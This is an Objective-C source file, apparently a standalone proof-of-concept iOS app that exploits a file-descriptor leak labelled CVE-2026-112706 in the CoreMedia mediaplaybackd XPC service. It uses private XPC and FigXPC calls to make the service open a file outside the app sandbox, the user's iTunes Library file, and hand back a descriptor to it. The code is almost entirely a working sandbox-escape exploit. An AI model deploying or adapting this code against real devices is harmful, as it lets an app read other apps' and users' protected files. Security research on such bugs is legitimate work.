#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <unistd.h>
#import <xpc/xpc.h>

// Standalone KexProof — no UIKit, no scene management
// All output goes to file, no UI

static FILE *g_logFile = NULL;

static void log_line(NSString *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    NSLog(@"[KP] %@", msg);
    if (g_logFile) {
        fprintf(g_logFile, "%s\n", msg.UTF8String);
        fflush(g_logFile);
    }
}

// FD leak preflight (CVE-2026-112706)
static void run_fdleak(void) {
    log_line(@"=== FD Leak (CVE-2026-112706) ===");

    // Load XPC
    void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
    typedef void* (*xpc_create_t)(const char *, void *, uint64_t);
    typedef void (*xpc_fn_t)(void *);
    typedef void (*xpc_send_t)(void *, void *, void *, void *);
    typedef int (*xpc_fd_t)(void *, const char *);

    xpc_create_t xpc_create = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_create_mach_service");
    xpc_fn_t xpc_resume = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_resume");
    xpc_fn_t xpc_cancel = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_cancel");
    xpc_send_t xpc_send = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_send_message_with_reply");
    xpc_fd_t xpc_dup_fd = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_dup_fd");

    log_line(@"XPC symbols: create=%p resume=%p cancel=%p send=%p dup_fd=%p",
             xpc_create, xpc_resume, xpc_cancel, xpc_send, xpc_dup_fd);

    if (!xpc_create) {
        log_line(@"XPC functions not available");
        return;
    }

    // Create connection
    void *conn = xpc_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
    if (!conn) {
        log_line(@"connection FAILED");
        return;
    }
    log_line(@"connection CREATED");
    if (xpc_resume) xpc_resume(conn);
    log_line(@"connection RESUMED");

    // Load FigXPC
    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
    typedef void* (*fig_create_t)(uint32_t, void *);
    typedef void (*fig_set_url_t)(void *, const char *, void *);
    fig_create_t fig_create = dlsym(cm, "FigXPCCreateBasicMessage");
    fig_set_url_t fig_set_url = dlsym(cm, "FigXPCMessageSetCFURL");
    log_line(@"FigXPC: create=%p set_url=%p", fig_create, fig_set_url);

    if (!fig_create) {
        log_line(@"FigXPC not available");
        if (xpc_cancel) xpc_cancel(conn);
        return;
    }

    // Handshake
    const char *ops[] = {".rp1", ".rp2", ".org"};
    for (int i = 0; i < 3; i++) {
        uint32_t opcode = 0;
        memcpy(&opcode, ops[i], 4);
        void *msg = fig_create(opcode, NULL);
        if (!msg) {
            log_line(@"handshake %s: create failed", ops[i]);
            continue;
        }
        __block void *reply = NULL;
        if (xpc_send) {
            xpc_send(conn, msg, NULL, (__bridge void *)^(void *r) { reply = r; });
            usleep(100000);
        }
        log_line(@"handshake %s: reply=%p", ops[i], reply);
    }

    // Curl create
    void *curlMsg = fig_create('Curl', NULL);
    if (curlMsg && fig_set_url) {
        NSString *urlStr = @"file:///private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp";
        CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
        fig_set_url(curlMsg, "CreationURL", url);
        CFRelease(url);
        log_line(@"Curl create: %@", urlStr);

        __block void *curlReply = NULL;
        if (xpc_send) {
            xpc_send(conn, curlMsg, NULL, (__bridge void *)^(void *r) { curlReply = r; });
            usleep(200000);
        }

        if (curlReply && xpc_dup_fd) {
            int fd = xpc_dup_fd(curlReply, "FileDescriptor");
            log_line(@"GOT FD: %d", fd);
            if (fd >= 0) {
                struct stat st;
                if (fstat(fd, &st) == 0) {
                    log_line(@"file size: %lld", (long long)st.st_size);
                }
                close(fd);
            }
        } else {
            log_line(@"no reply or dup_fd unavailable");
        }
    }

    if (xpc_cancel) xpc_cancel(conn);
    log_line(@"connection cancelled");
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-standalone.log"];
        g_logFile = fopen(logPath.fileSystemRepresentation, "w");

        log_line(@"=== KexProof Standalone ===");
        log_line(@"Target: iOS 27.0.1 / iPhone 15 Pro");
        log_line(@"PID: %d UID: %d", getpid(), getuid());

        // Run fd leak
        run_fdleak();

        log_line(@"=== Done ===");
        if (g_logFile) fclose(g_logFile);

        // Keep app alive for a moment so log can be read
        sleep(3);
        return 0;
    }
}
